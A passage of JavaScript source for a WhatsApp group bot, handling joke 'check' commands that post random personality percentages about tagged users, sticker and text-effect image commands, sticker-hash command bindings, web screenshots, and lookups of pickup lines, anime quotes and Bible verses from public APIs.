            { quoted: m }
          );
        }
        break;
      case "checkme":
        neme = args.join(" ");
        bet = `${sender}`;
        var sifat = [
          "Fine",
          "Unfriendly",
          "Chapri",
          "Nibba/nibbi",
          "Annoying",
          "Dilapidated",
          "Angry person",
          "Polite",
          "Burden",
          "Great",
          "Cringe",
          "Liar",
        ];
        var hoby = [
          "Cooking",
          "Dancing",
          "Playing",
          "Gaming",
          "Painting",
          "Helping Others",
          "Watching anime",
          "Reading",
          "Riding Bike",
          "Singing",
          "Chatting",
          "Sharing Memes",
          "Drawing",
          "Eating Parents Money",
          "Playing Truth or Dare",
          "Staying Alone",
        ];
        var bukcin = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        var arp = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        var cakep = ["Yes", "No", "Very Ugly", "Very Handsome"];
        var wetak = [
          "Caring",
          "Generous",
          "Angry person",
          "Sorry",
          "Submissive",
          "Fine",
          "Im sorry",
          "Kind Hearted",
          "Patient",
          "UwU",
          "Top",
          "Helpful",
        ];
        var baikk = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        var bhuruk = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        var cerdhas = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        var berhani = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        var mengheikan = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        var sipat = sifat[Math.floor(Math.random() * sifat.length)];
        var biho = hoby[Math.floor(Math.random() * hoby.length)];
        var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)];
        var senga = arp[Math.floor(Math.random() * arp.length)];
        var chakep = cakep[Math.floor(Math.random() * cakep.length)];
        var watak = wetak[Math.floor(Math.random() * wetak.length)];
        var baik = baikk[Math.floor(Math.random() * baikk.length)];
        var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)];
        var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)];
        var berani = berhani[Math.floor(Math.random() * berhani.length)];
        var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)];
        profile = `*≡══《 Check @${bet.split("@")[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`;
        try {
          ppuser = await OctopusBotzz.profilePictureUrl(m.sender, "image");
        } catch (err) {
          ppuser =
            "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
        }
        ppxeon = await getBuffer(ppuser);
        OctopusBotzz.sendMessage(
          from,
          { image: ppxeon, caption: profile, mentions: [bet] },
          { quoted: m }
        );
        break;
      case "handsomecheck":
        if (!text)
          return replyLinkGc(
            `Tag Someone, Example : ${prefix + command} @Xeon`
          );
        const gan = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        const teng = gan[Math.floor(Math.random() * gan.length)];
        OctopusBotzz.sendMessage(
          from,
          {
            text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*`,
          },
          { quoted: m }
        );
        break;
      case "beautifulcheck":
        if (!text)
          return replyLinkGc(
            `Tag Someone, Example : ${prefix + command} @Xeon`
          );
        const can = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        const tik = can[Math.floor(Math.random() * can.length)];
        OctopusBotzz.sendMessage(
          from,
          { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` },
          { quoted: m }
        );
        break;
      case "charactercheck":
        if (!text)
          return replyLinkGc(
            `Tag Someone, Example : ${prefix + command} @Xeon`
          );
        const xeony = [
          "Compassionate",
          "Generous",
          "Grumpy",
          "Forgiving",
          "Obedient",
          "Good",
          "Simp",
          "Kind-Hearted",
          "patient",
          "UwU",
          "top, anyway",
          "Helpful",
        ];
        const taky = xeony[Math.floor(Math.random() * xeony.length)];
        OctopusBotzz.sendMessage(
          from,
          { text: `Character Check : ${q}\nAnswer : *${taky}*` },
          { quoted: m }
        );
        break;
      case "awesomecheck":
      case "greatcheck":
      case "gaycheck":
      case "cutecheck":
      case "lesbicheck":
      case "lesbiancheck":
      case "hornycheck":
      case "prettycheck":
      case "lovelycheck":
      case "uglycheck":
        if (!m.isGroup) return XeonStickGroup();
        const cex = body.slice(0);
        const cek1 = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        const cek2 = cek1[Math.floor(Math.random() * cek1.length)];
        if (mentionByReply) {
          OctopusBotzz.sendMessage(
            from,
            {
              text:
                "Question : *" +
                cex +
                "*\nChecker : " +
                `@${mentionByReply.split("@")[0]}` +
                "\nAnswer : " +
                cek2 +
                "%",
              mentions: [mentionByReply],
            },
            { quoted: m }
          );
        } else if (mentionByTag[0] && isGroup) {
          OctopusBotzz.sendMessage(
            from,
            {
              text:
                "Question : *" +
                cex +
                "*\nChecker : " +
                `@${mentionByTag[0].split("@")[0]}` +
                "\nAnswer : " +
                cek2 +
                "%",
              mentions: [mentionByTag[0]],
            },
            { quoted: m }
          );
        } else if (!mentionByReply && !mentionByTag[0]) {
          OctopusBotzz.sendMessage(
            from,
            {
              text:
                "Question : *" +
                cex +
                "*\nChecker : " +
                `@${sender.split("@")[0]}` +
                "\nAnswer : " +
                cek2 +
                "%",
              mentions: [sender],
            },
            { quoted: m }
          );
        }
        break;
      case "patrick":
      case "patricksticker":
        {
          var ano = await fetchJson(
            "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/main/patrick"
          );
          var wifegerak = ano.split("\n");
          var wifegerakx =
            wifegerak[Math.floor(Math.random() * wifegerak.length)];
          encmedia = await OctopusBotzz.sendImageAsSticker(
            from,
            wifegerakx,
            m,
            {
              packname: global.packname,
              author: global.author,
            }
          );
        }
        break;
      case "dogesticker":
      case "dogestick":
      case "doge":
        {
          var ano = await fetchJson(
            "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/main/doge"
          );
          var wifegerak = ano.split("\n");
          var wifegerakx =
            wifegerak[Math.floor(Math.random() * wifegerak.length)];
          encmedia = await OctopusBotzz.sendImageAsSticker(
            from,
            wifegerakx,
            m,
            {
              packname: global.packname,
              author: global.author,
            }
          );
        }
        break;
      case "lovesticker":
      case "lovestick":
        {
          var ano = await fetchJson(
            "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/main/love"
          );
          var wifegerak = ano.split("\n");
          var wifegerakx =
            wifegerak[Math.floor(Math.random() * wifegerak.length)];
          encmedia = await OctopusBotzz.sendImageAsSticker(
            from,
            wifegerakx,
            m,
            {
              packname: global.packname,
              author: global.author,
            }
          );
        }
        break;
      case "gura":
      case "gurastick":
        {
          var ano = await fetchJson(
            "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/main/gura"
          );
          var wifegerak = ano.split("\n");
          var wifegerakx =
            wifegerak[Math.floor(Math.random() * wifegerak.length)];
          encmedia = await OctopusBotzz.sendImageAsSticker(
            from,
            wifegerakx,
            m,
            {
              packname: global.packname,
              author: global.author,
            }
          );
        }
        break;
      case "telestick":
        {
          if (m.isGroup) return XeonStickPrivate();
          if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
            let xeonresources = await Telesticker(args[0]);
            await replyLinkGc(`Sending ${xeonresources.length} stickers...`);
            if (m.isGroup && xeonresources.length > 30) {
              await replyLinkGc(
                "Number of stickers more than 30, bot will send it in private chat."
              );
              for (let i = 0; i < xeonresources.length; i++) {
                OctopusBotzz.sendMessage(m.sender, {
                  sticker: { url: xeonresources[i].url },
                });
              }
            } else {
              for (let i = 0; i < xeonresources.length; i++) {
                OctopusBotzz.sendMessage(m.chat, {
                  sticker: { url: xeonresources[i].url },
                });
              }
            }
          } else
            replyLinkGc(
              `Where is the telegram sticker link?\nExample. ${
                prefix + command
              } https://t.me/addstickers/FriendlyDeath`
            );
        }
        break;
      case "shadow":
      case "write":
      case "romantic":
      case "burnpaper":
      case "smoke":
      case "narutobanner":
      case "love":
      case "undergrass":
      case "doublelove":
      case "coffecup":
      case "underwaterocean":
      case "smokyneon":
      case "starstext":
      case "rainboweffect":
      case "balloontext":
      case "metalliceffect":
      case "embroiderytext":
      case "flamingtext":
      case "stonetext":
      case "writeart":
      case "summertext":
      case "wolfmetaltext":
      case "nature3dtext":
      case "rosestext":
      case "naturetypography":
      case "quotesunder":
      case "shinetext":
        {
          if (!q)
            return replyLinkGc(`Example : ${prefix + command} OctopusBotzz`);
          await XeonStickWait();
          const photooxy = require("./lib/photooxy");
          let link;
          if (/stonetext/.test(command))
            link =
              "https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html";
          if (/writeart/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html";
          if (/summertext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html";
          if (/wolfmetaltext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html";
          if (/nature3dtext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html";
          if (/rosestext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html";
          if (/naturetypography/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html";
          if (/quotesunder/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html";
          if (/shinetext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html";
          if (/shadow/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html";
          if (/write/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html";
          if (/romantic/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html";
          if (/burnpaper/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html";
          if (/smoke/.test(command))
            link =
              "https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html";
          if (/narutobanner/.test(command))
            link =
              "https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html";
          if (/love/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html";
          if (/undergrass/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html";
          if (/doublelove/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/love-text-effect-372.html";
          if (/coffecup/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html";
          if (/underwaterocean/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html";
          if (/smokyneon/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html";
          if (/starstext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html";
          if (/rainboweffect/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html";
          if (/balloontext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html";
          if (/metalliceffect/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html";
          if (/embroiderytext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html";
          if (/flamingtext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html";
          let dehe = await photooxy.photoOxy(link, q);
          OctopusBotzz.sendMessage(
            m.chat,
            { image: { url: dehe }, caption: mess.success },
            { quoted: m }
          );
        }
        break;
      case "glitchtext":
      case "writetext":
      case "advancedglow":
      case "typographytext":
      case "pixelglitch":
      case "neonglitch":
      case "flagtext":
      case "flag3dtext":
      case "deletingtext":
      case "blackpinkstyle":
      case "glowingtext":
      case "underwatertext":
      case "logomaker":
      case "cartoonstyle":
      case "papercutstyle":
      case "watercolortext":
      case "effectclouds":
      case "blackpinklogo":
      case "gradienttext":
      case "summerbeach":
      case "luxurygold":
      case "multicoloredneon":
      case "sandsummer":
      case "galaxywallpaper":
      case "1917style":
      case "makingneon":
      case "royaltext":
      case "freecreate":
      case "galaxystyle":
      case "lighteffects":
        {
          if (!q)
            return replyLinkGc(`Example : ${prefix + command} OctopusBotzz`);
          await XeonStickWait();
          let link;
          if (/glitchtext/.test(command))
            link =
              "https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html";
          if (/writetext/.test(command))
            link =
              "https://en.ephoto360.com/write-text-on-wet-glass-online-589.html";
          if (/advancedglow/.test(command))
            link = "https://en.ephoto360.com/advanced-glow-effects-74.html";
          if (/typographytext/.test(command))
            link =
              "https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";
          if (/pixelglitch/.test(command))
            link =
              "https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html";
          if (/neonglitch/.test(command))
            link =
              "https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html";
          if (/flagtext/.test(command))
            link =
              "https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html";
          if (/flag3dtext/.test(command))
            link =
              "https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html";
          if (/deletingtext/.test(command))
            link =
              "https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html";
          if (/blackpinkstyle/.test(command))
            link =
              "https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html";
          if (/glowingtext/.test(command))
            link =
              "https://en.ephoto360.com/create-glowing-text-effects-online-706.html";
          if (/underwatertext/.test(command))
            link =
              "https://en.ephoto360.com/3d-underwater-text-effect-online-682.html";
          if (/logomaker/.test(command))
            link =
              "https://en.ephoto360.com/free-bear-logo-maker-online-673.html";
          if (/cartoonstyle/.test(command))
            link =
              "https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html";
          if (/papercutstyle/.test(command))
            link =
              "https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html";
          if (/watercolortext/.test(command))
            link =
              "https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html";
          if (/effectclouds/.test(command))
            link =
              "https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html";
          if (/blackpinklogo/.test(command))
            link =
              "https://en.ephoto360.com/create-blackpink-logo-online-free-607.html";
          if (/gradienttext/.test(command))
            link =
              "https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html";
          if (/summerbeach/.test(command))
            link =
              "https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html";
          if (/luxurygold/.test(command))
            link =
              "https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html";
          if (/multicoloredneon/.test(command))
            link =
              "https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html";
          if (/sandsummer/.test(command))
            link =
              "https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html";
          if (/galaxywallpaper/.test(command))
            link =
              "https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html";
          if (/1917style/.test(command))
            link = "https://en.ephoto360.com/1917-style-text-effect-523.html";
          if (/makingneon/.test(command))
            link =
              "https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html";
          if (/royaltext/.test(command))
            link =
              "https://en.ephoto360.com/royal-text-effect-online-free-471.html";
          if (/freecreate/.test(command))
            link =
              "https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html";
          if (/galaxystyle/.test(command))
            link =
              "https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html";
          if (/lighteffects/.test(command))
            link =
              "https://en.ephoto360.com/create-light-effects-green-neon-online-429.html";
          let haldwhd = await ephoto(link, q);
          OctopusBotzz.sendMessage(
            m.chat,
            { image: { url: haldwhd }, caption: `${mess.success}` },
            { quoted: m }
          );
        }
        break;
      case "setcmd":
        {
          if (!m.quoted) return replyLinkGc("Reply Message!");
          if (!m.quoted.fileSha256) return replyLinkGc("SHA256 Hash Missing");
          if (!text) return replyLinkGc(`For What Command?`);
          let hash = m.quoted.fileSha256.toString("base64");
          if (
            global.db.data.sticker[hash] &&
            global.db.data.sticker[hash].locked
          )
            return replyLinkGc(
              "You have no permission to change this sticker command"
            );
          global.db.data.sticker[hash] = {
            text,
            mentionedJid: m.mentionedJid,
            creator: m.sender,
            at: +new Date(),
            locked: false,
          };
          replyLinkGc(`Done!`);
        }
        break;
      case "delcmd":
        {
          let hash = m.quoted.fileSha256.toString("base64");
          if (!hash) return replyLinkGc(`No hashes`);
          if (
            global.db.data.sticker[hash] &&
            global.db.data.sticker[hash].locked
          )
            return replyLinkGc(
              "You have no permission to delete this sticker command"
            );
          delete global.db.data.sticker[hash];
          replyLinkGc(`Done!`);
        }
        break;
      case "listcmd":
        {
          let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker)
  .map(
    ([key, value], index) =>
      `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`
  )
  .join("\n")}
`.trim();
          OctopusBotzz.sendText(m.chat, teks, m, {
            mentions: Object.values(global.db.data.sticker)
              .map((x) => x.mentionedJid)
              .reduce((a, b) => [...a, ...b], []),
          });
        }
        break;
      case "lockcmd":
        {
          if (!isCreator) return XeonStickOwner();
          if (!m.quoted) return replyLinkGc("Reply Message!");
          if (!m.quoted.fileSha256) return replyLinkGc("SHA256 Hash Missing");
          let hash = m.quoted.fileSha256.toString("base64");
          if (!(hash in global.db.data.sticker))
            return replyLinkGc("Hash not found in database");
          global.db.data.sticker[hash].locked = !/^un/i.test(command);
          replyLinkGc("Done!");
        }
        break;
      case "ss":
      case "ssweb":
        {
          if (!q) return replyLinkGc(`Example ${prefix + command} link`);
          await XeonStickWait();
          let krt = await scp2.ssweb(q);
          OctopusBotzz.sendMessage(
            from,
            { image: krt.result, caption: mess.succes },
            { quoted: m }
          );
        }
        break;
      case "pickupline":
        {
          try {
            let res = await fetch(`https://api.popcat.xyz/pickuplines`);
            if (!res.ok) {
              throw new Error(`API request failed with status ${res.status}`);
            }
            let json = await res.json();
            let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`;
            replyLinkGc(pickupLine);
          } catch (error) {
            console.error(error);
            // Handle the error appropriately
          }
        }
        break;
      case "animequote":
        {
          try {
            const res = await fetch("https://some-random-api.com/animu/quote");
            if (!res.ok) throw await res.text();
            const json = await res.json();
            const { sentence, character, anime } = json;
            const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`;
            OctopusBotzz.sendMessage(
              m.chat,
              { text: message },
              "extendedTextMessage",
              { quoted: m }
            );
          } catch (error) {
            console.error(error);
          }
        }
        break;
      case "bible":
        {
          const { translate } = require("@vitalets/google-translate-api");
          const BASE_URL = "https://bible-api.com";
          try {
            // Extract the chapter number or name from the command text.
            let chapterInput = m.text.split(" ").slice(1).join("").trim();
            if (!chapterInput) {
              throw new Error(
                `Please specify the chapter number or name. Example: ${
                  prefix + command
                } john 3:16`
              );
            }
            // Encode the chapterInput to handle special characters
            chapterInput = encodeURIComponent(chapterInput);
            // Make an API request to fetch the chapter information.
            let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`);
            if (!chapterRes.ok) {
              throw new Error(
                `Please specify the chapter number or name. Example: ${
                  prefix + command
                } john 3:16`
              );
            }
            let chapterData = await chapterRes.json();
            let translatedChapterHindi = await translate(chapterData.text, {
              to: "hi",
              autoCorrect: true,
            });
            let translatedChapterEnglish = await translate(chapterData.text, {
              to: "en",
              autoCorrect: true,
            });
            let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`;
            replyLinkGc(bibleChapter);
